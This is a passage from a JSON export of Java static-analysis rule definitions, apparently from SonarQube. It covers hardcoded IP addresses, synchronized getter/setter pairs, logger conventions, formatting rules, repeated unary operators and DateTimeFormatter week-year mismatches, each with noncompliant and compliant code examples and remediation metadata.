            "htmlDesc": "<p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901\">CVE-2006-5901</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725\">CVE-2005-3725</a> </li>\n</ul>\n<p>Today's services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always\nhave the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,\ndelivery, and deployment:</p>\n<ul>\n  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>\n  <li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li>\n</ul>\n<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially\nsensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to\nbypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which\nwill increase an attack's impact.</p>\n<h2>Ask Yourself Whether</h2>\n<p>The disclosed IP address is sensitive, e.g.:</p>\n<ul>\n  <li> Can give information to an attacker about the network topology. </li>\n  <li> It's a personal (assigned to an identifiable person) IP address. </li>\n</ul>\n<p>There is a risk if you answered yes to any of these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Don't hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar\napproach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having\nto rebuild the software.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nString ip = \"192.168.12.42\"; // Sensitive\nSocket socket = new Socket(ip, 6667);\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nString ip = System.getenv(\"IP_ADDRESS\"); // Compliant\nSocket socket = new Socket(ip, 6667);\n</pre>\n<h2>Exceptions</h2>\n<p>No issue is reported for the following cases because they are not considered sensitive:</p>\n<ul>\n  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>\n  <li> Broadcast address 255.255.255.255 </li>\n  <li> Non routable address 0.0.0.0 </li>\n  <li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href=\"http://www.oid-info.com/introduction.htm\">often match\n  Object Identifiers</a> (OID). </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure\n  </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/OjdGBQ\">CERT, MSC03-J.</a> - Never hard code sensitive information </li>\n</ul>",
            "mdDesc": "<p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901\">CVE-2006-5901</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725\">CVE-2005-3725</a> </li>\n</ul>\n<p>Today's services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always\nhave the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,\ndelivery, and deployment:</p>\n<ul>\n  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>\n  <li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li>\n</ul>\n<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially\nsensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to\nbypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which\nwill increase an attack's impact.</p>\n<h2>Ask Yourself Whether</h2>\n<p>The disclosed IP address is sensitive, e.g.:</p>\n<ul>\n  <li> Can give information to an attacker about the network topology. </li>\n  <li> It's a personal (assigned to an identifiable person) IP address. </li>\n</ul>\n<p>There is a risk if you answered yes to any of these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Don't hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar\napproach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having\nto rebuild the software.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nString ip = \"192.168.12.42\"; // Sensitive\nSocket socket = new Socket(ip, 6667);\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nString ip = System.getenv(\"IP_ADDRESS\"); // Compliant\nSocket socket = new Socket(ip, 6667);\n</pre>\n<h2>Exceptions</h2>\n<p>No issue is reported for the following cases because they are not considered sensitive:</p>\n<ul>\n  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>\n  <li> Broadcast address 255.255.255.255 </li>\n  <li> Non routable address 0.0.0.0 </li>\n  <li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href=\"http://www.oid-info.com/introduction.htm\">often match\n  Object Identifiers</a> (OID). </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure\n  </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/OjdGBQ\">CERT, MSC03-J.</a> - Never hard code sensitive information </li>\n</ul>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "owasp-a3"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "30min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "30min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "30min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "30min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "SECURITY_HOTSPOT"
        },
        {
            "key": "java:S2886",
            "repo": "java",
            "name": "Getters and setters should be synchronized in pairs",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>When one part of a getter/setter pair is <code>synchronized</code> the other part should be too. Failure to synchronize both sides of a pair may\nresult in inconsistent behavior at runtime as callers access an inconsistent method state.</p>\n<p>This rule raises an issue when either the method or the contents of one method in a getter/setter pair are synchrnoized but the other is not.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Person {\n  String name;\n  int age;\n\n  public synchronized void setName(String name) {\n    this.name = name;\n  }\n\n  public String getName() {  // Noncompliant\n    return this.name;\n  }\n\n  public void setAge(int age) {  // Noncompliant\n    this.age = age;\n  }\n\n  public int getAge() {\n    synchronized (this) {\n      return this.age;\n    }\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class Person {\n  String name;\n  int age;\n\n  public synchronized void setName(String name) {\n    this.name = name;\n  }\n\n  public synchronized String getName() {\n    return this.name;\n  }\n\n  public void setAge(int age) {\n    synchronized (this) {\n      this.age = age;\n   }\n  }\n\n  public int getAge() {\n    synchronized (this) {\n      return this.age;\n    }\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/4jdGBQ\">CERT, VNA01-J.</a> - Ensure visibility of shared references to immutable objects </li>\n</ul>",
            "mdDesc": "<p>When one part of a getter/setter pair is <code>synchronized</code> the other part should be too. Failure to synchronize both sides of a pair may\nresult in inconsistent behavior at runtime as callers access an inconsistent method state.</p>\n<p>This rule raises an issue when either the method or the contents of one method in a getter/setter pair are synchrnoized but the other is not.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Person {\n  String name;\n  int age;\n\n  public synchronized void setName(String name) {\n    this.name = name;\n  }\n\n  public String getName() {  // Noncompliant\n    return this.name;\n  }\n\n  public void setAge(int age) {  // Noncompliant\n    this.age = age;\n  }\n\n  public int getAge() {\n    synchronized (this) {\n      return this.age;\n    }\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class Person {\n  String name;\n  int age;\n\n  public synchronized void setName(String name) {\n    this.name = name;\n  }\n\n  public synchronized String getName() {\n    return this.name;\n  }\n\n  public void setAge(int age) {\n    synchronized (this) {\n      this.age = age;\n   }\n  }\n\n  public int getAge() {\n    synchronized (this) {\n      return this.age;\n    }\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/4jdGBQ\">CERT, VNA01-J.</a> - Ensure visibility of shared references to immutable objects </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "multi-threading"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S1312",
            "repo": "java",
            "name": "Loggers should be \"private static final\" and should share a naming convention",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Regardless of the logging framework in use (logback, log4j, commons-logging, java.util.logging, ...), loggers should be:</p>\n<ul>\n  <li> <code>private</code>: never be accessible outside of its parent class. If another class needs to log something, it should instantiate its own\n  logger. </li>\n  <li> <code>static</code>: not be dependent on an instance of a class (an object). When logging something, contextual information can of course be\n  provided in the messages but the logger should be created at class level to prevent creating a logger along with each object. </li>\n  <li> <code>final</code>: be created once and only once per class. </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<p>With a default regular expression of <code>LOG(?:GER)?</code>:</p>\n<pre>\npublic Logger logger = LoggerFactory.getLogger(Foo.class);  // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nprivate static final Logger LOGGER = LoggerFactory.getLogger(Foo.class);\n</pre>\n<h2>Exceptions</h2>\n<p>Variables of type <code>org.apache.maven.plugin.logging.Log</code> are ignored.</p>",
            "mdDesc": "<p>Regardless of the logging framework in use (logback, log4j, commons-logging, java.util.logging, ...), loggers should be:</p>\n<ul>\n  <li> <code>private</code>: never be accessible outside of its parent class. If another class needs to log something, it should instantiate its own\n  logger. </li>\n  <li> <code>static</code>: not be dependent on an instance of a class (an object). When logging something, contextual information can of course be\n  provided in the messages but the logger should be created at class level to prevent creating a logger along with each object. </li>\n  <li> <code>final</code>: be created once and only once per class. </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<p>With a default regular expression of <code>LOG(?:GER)?</code>:</p>\n<pre>\npublic Logger logger = LoggerFactory.getLogger(Foo.class);  // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nprivate static final Logger LOGGER = LoggerFactory.getLogger(Foo.class);\n</pre>\n<h2>Exceptions</h2>\n<p>Variables of type <code>org.apache.maven.plugin.logging.Log</code> are ignored.</p>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "convention"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [
                {
                    "key": "format",
                    "htmlDesc": "Regular expression used to check the logger names against.",
                    "defaultValue": "LOG(?:GER)?",
                    "type": "STRING"
                }
            ],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S3972",
            "repo": "java",
            "name": "Conditionals should start on new lines",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Code is clearest when each statement has its own line. Nonetheless, it is a common pattern to combine on the same line an <code>if</code> and its\nresulting <em>then</em> statement. However, when an <code>if</code> is placed on the same line as the closing <code>}</code> from a preceding\n<em>then</em>, <em>else</em> or <em>else if</em> part, it is either an error - <code>else</code> is missing - or the invitation to a future error as\nmaintainers fail to understand that the two statements are unconnected.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (condition1) {\n  // ...\n} if (condition2) {  // Noncompliant\n  //...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nif (condition1) {\n  // ...\n} else if (condition2) {\n  //...\n}\n</pre>\n<p>Or</p>\n<pre>\nif (condition1) {\n  // ...\n}\n\nif (condition2) {\n  //...\n}\n</pre>",
            "mdDesc": "<p>Code is clearest when each statement has its own line. Nonetheless, it is a common pattern to combine on the same line an <code>if</code> and its\nresulting <em>then</em> statement. However, when an <code>if</code> is placed on the same line as the closing <code>}</code> from a preceding\n<em>then</em>, <em>else</em> or <em>else if</em> part, it is either an error - <code>else</code> is missing - or the invitation to a future error as\nmaintainers fail to understand that the two statements are unconnected.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (condition1) {\n  // ...\n} if (condition2) {  // Noncompliant\n  //...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nif (condition1) {\n  // ...\n} else if (condition2) {\n  //...\n}\n</pre>\n<p>Or</p>\n<pre>\nif (condition1) {\n  // ...\n}\n\nif (condition2) {\n  //...\n}\n</pre>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "suspicious"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1311",
            "repo": "java",
            "name": "Cyclomatic Complexity of classes should not be too high",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>The Cyclomatic Complexity is measured by the number of <code>&amp;&amp;</code> and <code>||</code> operators and <code>if</code>,\n<code>while</code>, <code>do</code>, <code>for</code>, <code>?:</code>, <code>catch</code>, <code>switch</code>, <code>case</code>,\n<code>return</code> and <code>throw</code> statements in the body of a class plus one for each constructor, method, static initializer, or instance\ninitializer in the class. The last return statement in method, if exists, is not taken into account.</p>\n<p>Even when the Cyclomatic Complexity of a class is very high, this complexity might be well distributed among all methods. Nevertheless, most of the\ntime, a very complex class is a class which breaks the Single Responsibility Principle and which should be re-factored to be split in several\nclasses.</p>\n<h2>Deprecated</h2>\n<p>This rule is deprecated, and will eventually be removed.</p>",
            "mdDesc": "<p>The Cyclomatic Complexity is measured by the number of <code>&amp;&amp;</code> and <code>||</code> operators and <code>if</code>,\n<code>while</code>, <code>do</code>, <code>for</code>, <code>?:</code>, <code>catch</code>, <code>switch</code>, <code>case</code>,\n<code>return</code> and <code>throw</code> statements in the body of a class plus one for each constructor, method, static initializer, or instance\ninitializer in the class. The last return statement in method, if exists, is not taken into account.</p>\n<p>Even when the Cyclomatic Complexity of a class is very high, this complexity might be well distributed among all methods. Nevertheless, most of the\ntime, a very complex class is a class which breaks the Single Responsibility Principle and which should be re-factored to be split in several\nclasses.</p>\n<h2>Deprecated</h2>\n<p>This rule is deprecated, and will eventually be removed.</p>",
            "severity": "CRITICAL",
            "status": "DEPRECATED",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [
                {
                    "key": "max",
                    "htmlDesc": "Maximum complexity allowed.",
                    "defaultValue": "200",
                    "type": "INTEGER"
                }
            ],
            "defaultDebtRemFnType": "LINEAR_OFFSET",
            "defaultDebtRemFnCoeff": "1min",
            "defaultDebtRemFnOffset": "10min",
            "effortToFixDescription": "per complexity point over the threshold",
            "debtOverloaded": false,
            "debtRemFnType": "LINEAR_OFFSET",
            "debtRemFnCoeff": "1min",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "LINEAR_OFFSET",
            "defaultRemFnGapMultiplier": "1min",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "LINEAR_OFFSET",
            "remFnGapMultiplier": "1min",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "gapDescription": "per complexity point over the threshold",
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1310",
            "repo": "java",
            "name": "Track uses of \"NOPMD\" suppression comments",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>This rule allows you to track the use of the PMD suppression comment mechanism. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n// NOPMD\n</pre>",
            "mdDesc": "<p>This rule allows you to track the use of the PMD suppression comment mechanism. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n// NOPMD\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "bad-practice"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S3973",
            "repo": "java",
            "name": "A conditionally executed single line should be denoted by indentation",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>In the absence of enclosing curly braces, the line immediately after a conditional is the one that is conditionally executed. By both convention\nand good practice, such lines are indented. In the absence of both curly braces and indentation the intent of the original programmer is entirely\nunclear and perhaps not actually what is executed. Additionally, such code is highly likely to be confusing to maintainers.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (condition)  // Noncompliant\ndoTheThing();\n\ndoTheOtherThing();\nsomethingElseEntirely();\n\nfoo();\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nif (condition)\n  doTheThing();\n\ndoTheOtherThing();\nsomethingElseEntirely();\n\nfoo();\n</pre>",
            "mdDesc": "<p>In the absence of enclosing curly braces, the line immediately after a conditional is the one that is conditionally executed. By both convention\nand good practice, such lines are indented. In the absence of both curly braces and indentation the intent of the original programmer is entirely\nunclear and perhaps not actually what is executed. Additionally, such code is highly likely to be confusing to maintainers.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (condition)  // Noncompliant\ndoTheThing();\n\ndoTheOtherThing();\nsomethingElseEntirely();\n\nfoo();\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nif (condition)\n  doTheThing();\n\ndoTheOtherThing();\nsomethingElseEntirely();\n\nfoo();\n</pre>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "confusing",
                "suspicious"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2761",
            "repo": "java",
            "name": "Unary prefix operators should not be repeated",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>The needless repetition of an operator is usually a typo. There is no reason to write <code>!!!i</code> when <code>!i</code> will do.</p>\n<p>On the other hand, the repetition of increment and decrement operators may have been done on purpose, but doing so obfuscates the meaning, and\nshould be simplified.</p>\n<p>This rule raises an issue for sequences of: <code>!</code>, <code>~</code>, <code>-</code>, and <code>+</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nint i = 1;\n\nint j = - - -i;  // Noncompliant; just use -i\nint k = ~~~i;    // Noncompliant; same as i\nint m = + +i;    // Noncompliant; operators are useless here\n\nboolean b = false;\nboolean c = !!!b;   // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nint i =  1;\n\nint j = -i;\nint k = ~i;\nint m =  i;\n\nboolean b = false;\nboolean c = !b;\n</pre>\n<h2>Exceptions</h2>\n<p>Overflow handling for GWT compilation using <code>~~</code> is ignored.</p>",
            "mdDesc": "<p>The needless repetition of an operator is usually a typo. There is no reason to write <code>!!!i</code> when <code>!i</code> will do.</p>\n<p>On the other hand, the repetition of increment and decrement operators may have been done on purpose, but doing so obfuscates the meaning, and\nshould be simplified.</p>\n<p>This rule raises an issue for sequences of: <code>!</code>, <code>~</code>, <code>-</code>, and <code>+</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nint i = 1;\n\nint j = - - -i;  // Noncompliant; just use -i\nint k = ~~~i;    // Noncompliant; same as i\nint m = + +i;    // Noncompliant; operators are useless here\n\nboolean b = false;\nboolean c = !!!b;   // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nint i =  1;\n\nint j = -i;\nint k = ~i;\nint m =  i;\n\nboolean b = false;\nboolean c = !b;\n</pre>\n<h2>Exceptions</h2>\n<p>Overflow handling for GWT compilation using <code>~~</code> is ignored.</p>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S5917",
            "repo": "java",
            "name": "DateTimeFormatters should not use mismatched year and week numbers",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>When creating a <code>DateTimeFormatter</code> using the <code>WeekFields.weekBasedYear()</code> temporal field, the resulting year number may be\noff by 1 at the beginning of a new year (when the date to format is in a week that is shared by two consecutive years). </p>\n<p>Using this year number in combination with an incompatible week temporal field yields a result that may be confused with the first week of the\nprevious year.</p>\n<p>Instead, when paired with a week temporal field, the week-based year should only be used with the week of week-based year temporal field\n<code>WeekFields.weekOfWeekBasedYear()</code>.</p>\n<p>Alternatively the temporal field <code>ChronoField.ALIGNED_WEEK_OF_YEAR</code> can be used together with a regular year (but not the week based\nyear).</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nnew DateTimeFormatterBuilder()\n      .appendValue(ChronoField.YEAR, 4) // Noncompliant: using week of week-based year with regular year\n      .appendLiteral('-')\n      .appendValue(WeekFields.ISO.weekOfWeekBasedYear(), 2)\n      .toFormatter();\n\nnew DateTimeFormatterBuilder()\n      .appendValue(ChronoField.YEAR_OF_ERA, 4) // Noncompliant: using week of week-based year with regular year\n      .appendLiteral('-')\n      .appendValue(WeekFields.ISO.weekOfWeekBasedYear(), 2)\n      .toFormatter();\n\nnew DateTimeFormatterBuilder()\n      .appendValue(WeekFields.ISO.weekBasedYear(), 4) // Noncompliant: using aligned week of year with week-based year\n      .appendLiteral('-')\n      .appendValue(ChronoField.ALIGNED_WEEK_OF_YEAR, 2)\n      .toFormatter();\n</pre>\n<p>Here the first two formatters would wrongly format the 1st of January 2016 as \"2016-53\" while the last one would format it as \"2015-01\"</p>\n<h2>Compliant Solution</h2>\n<pre>\nnew DateTimeFormatterBuilder()\n      .appendValue(WeekFields.ISO.weekBasedYear(), 4)\n      .appendLiteral('-')\n      .appendValue(WeekFields.ISO.weekOfWeekBasedYear(), 2)\n      .toFormatter();\n\nnew DateTimeFormatterBuilder()\n      .appendValue(ChronoField.YEAR, 4)\n      .appendLiteral('-')\n      .appendValue(ChronoField.ALIGNED_WEEK_OF_YEAR, 2)\n      .toFormatter();\n\nnew DateTimeFormatterBuilder()\n      .appendValue(ChronoField.YEAR_OF_ERA, 4)\n      .appendLiteral('-')\n      .appendValue(ChronoField.ALIGNED_WEEK_OF_YEAR, 2)\n      .toFormatter();\n</pre>\n<p>Here the first formatter would format the 1st of January 2016 as \"2015-53\" while the last two would produce \"2016-01\", both of which are correct\ndepending on how you count the weeks.</p>\n<h2>Exceptions</h2>\n<p>No issue is raised when week-based year is not used in combination with a week temporal field.</p>\n<p>Similarly, no issue is raised if week of week-based year is not used in combination with a year temporal field.</p>",
            "mdDesc": "<p>When creating a <code>DateTimeFormatter</code> using the <code>WeekFields.weekBasedYear()</code> temporal field, the resulting year number may be\noff by 1 at the beginning of a new year (when the date to format is in a week that is shared by two consecutive years). </p>\n<p>Using this year number in combination with an incompatible week temporal field yields a result that may be confused with the first week of the\nprevious year.</p>\n<p>Instead, when paired with a week temporal field, the week-based year should only be used with the week of week-based year temporal field\n<code>WeekFields.weekOfWeekBasedYear()</code>.</p>\n<p>Alternatively the temporal field <code>ChronoField.ALIGNED_WEEK_OF_YEAR</code> can be used together with a regular year (but not the week based\nyear).</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nnew DateTimeFormatterBuilder()\n      .appendValue(ChronoField.YEAR, 4) // Noncompliant: using week of week-based year with regular year\n      .appendLiteral('-')\n      .appendValue(WeekFields.ISO.weekOfWeekBasedYear(), 2)\n      .toFormatter();\n\nnew DateTimeFormatterBuilder()\n      .appendValue(ChronoField.YEAR_OF_ERA, 4) // Noncompliant: using week of week-based year with regular year\n      .appendLiteral('-')\n      .appendValue(WeekFields.ISO.weekOfWeekBasedYear(), 2)\n      .toFormatter();\n\nnew DateTimeFormatterBuilder()\n      .appendValue(WeekFields.ISO.weekBasedYear(), 4) // Noncompliant: using aligned week of year with week-based year\n      .appendLiteral('-')\n      .appendValue(ChronoField.ALIGNED_WEEK_OF_YEAR, 2)\n      .toFormatter();\n</pre>\n<p>Here the first two formatters would wrongly format the 1st of January 2016 as \"2016-53\" while the last one would format it as \"2015-01\"</p>\n<h2>Compliant Solution</h2>\n<pre>\nnew DateTimeFormatterBuilder()\n      .appendValue(WeekFields.ISO.weekBasedYear(), 4)\n      .appendLiteral('-')\n      .appendValue(WeekFields.ISO.weekOfWeekBasedYear(), 2)\n      .toFormatter();\n\nnew DateTimeFormatterBuilder()\n      .appendValue(ChronoField.YEAR, 4)\n      .appendLiteral('-')\n      .appendValue(ChronoField.ALIGNED_WEEK_OF_YEAR, 2)\n      .toFormatter();\n\nnew DateTimeFormatterBuilder()\n      .appendValue(ChronoField.YEAR_OF_ERA, 4)\n      .appendLiteral('-')\n      .appendValue(ChronoField.ALIGNED_WEEK_OF_YEAR, 2)\n      .toFormatter();\n</pre>\n<p>Here the first formatter would format the 1st of January 2016 as \"2015-53\" while the last two would produce \"2016-01\", both of which are correct\ndepending on how you count the weeks.</p>\n<h2>Exceptions</h2>\n<p>No issue is raised when week-based year is not used in combination with a week temporal field.</p>\n<p>Similarly, no issue is raised if week of week-based year is not used in combination with a year temporal field.</p>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S1319",
            "repo": "java",
            "name": "Declarations should use Java collection interfaces such as \"List\" rather than specific implementation classes such as \"LinkedList\"",
            "createdAt": "2022-09-26T07:32:37+0000",
